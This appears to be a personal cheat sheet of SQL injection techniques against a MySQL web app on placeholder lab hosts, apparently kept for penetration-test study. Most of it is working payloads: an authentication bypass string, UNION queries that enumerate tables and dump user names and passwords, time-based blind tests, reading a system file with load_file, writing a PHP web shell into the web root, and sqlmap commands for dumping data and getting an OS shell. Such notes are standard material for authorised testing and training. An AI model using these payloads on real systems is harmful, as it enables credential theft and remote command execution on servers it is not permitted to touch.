SQL Injection

Classic auth bypass:
' OR 1=1 limit 1;#

Error Based Enumeration:
You can try when you see an url like this 10.x.x.x/comment.php?id=292
Simply adding a simple quote after the number can produce an error.


10.x.x.x/comment.php?id=292 order by 1
10.x.x.x/comment.php?id=292 order by 2
10.x.x.x/comment.php?id=292 order by 3
10.x.x.x/comment.php?id=292 order by 4
10.x.x.x/comment.php?id=292 order by 5
10.x.x.x/comment.php?id=292 order by 6
10.x.x.x/comment.php?id=292 order by 7 <= error

You can use this technique to know how many colums there are in the database. If you see an error, it is because there isn't that much columns.


10.x.x.x/comment.php?id=292 union select 1,2,3,4,5,6


10.x.x.x/comment.php?id=292 union all select 1,2,3,4,@@version,6

10.x.x.x/comment.php?id=292 union all select 1,2,3,4,user(),6

Prints out all tables names of all databases
10.x.x.x/comment.php?id=292 union all select 1,2,3,4,table_name,6 FROM information_schema.tables

10.x.x.x/comment.php?id=292 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'

Extract name and passwords from the users table
10.x.x.x/comment.php?id=292 union all select 1,2,name,4,password,6 FROM users


Blind SQL Injection:
First we can test for sql injection like this:
10.x.x.x/comment.php?id=292 and 1=1;#

then
10.x.x.x/comment.php?id=292 and 1=2;#

Does the output changes? If yes, it's vulnerable.

An other method to detect sql injection is to add a sleep statement
10.x.x.x/comment.php?id=292-sleep(6)


If we need to guess the version we can use this technique
10.x.x.x/comment.php?id=483-IF(MID(@@version,1,1) = '5',sleep(5),0)
If the query hangs, it's a version beginning with 5 otherwise it's something else.


Trying to read a file with an SQL injection looks like this:
10.x.x.x/comment.php?id=838 union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6


If we want to create a malicious php file in the root of the webserver application, it would look like this:
10.x.x.x/comment.php?id=383 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>". 6 OUTFILE'c:/xampp/htdocs/backdoor.php'


Once the backdoor is created, we have command execution. We could access this backdoor like this:
10.x.x.x/backdoor.php?cmd=ipconfig


Bypassing interface restrictions (like search boxes or client side validation):
We can bypass these restrictions by using a tool such as Burp or Tamper Data.

Sqlmap:
sqlmap -u http://10.x.x.x --crawl=1
sqlmap -u http://10.x.x.x/comment.php?id=737 --dbms=mysql --dump --threads 5


We can use the parameter --os-shell to try to load a file to the vulnerable web server
sqlmap -u http://10.x.x.x/comment.php?id=737 --dbms=mysql --os-shell
If it succeed, we are provided a command shell directly in our terminal.


When trying to sql inject a login form, don't forget to try to register a user like admin= with a password.

Don't forget about padbuster if you need to crack some cookies.
